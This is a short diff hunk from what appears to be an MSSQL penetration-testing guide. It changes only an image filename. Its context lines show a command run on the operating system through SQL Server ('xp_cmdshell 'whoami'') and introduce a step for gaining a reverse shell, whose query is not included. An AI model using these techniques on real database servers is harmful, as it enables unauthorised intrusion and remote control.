@@ -31,7 +31,7 @@ RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
 ```
 
-![](<../../../.gitbook/assets/image (60) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (60) (1) (1) (1) (1) (1).png>)
 
 3\. Gain a reverse shell and execute commands by executing the following query after doing the following:
 
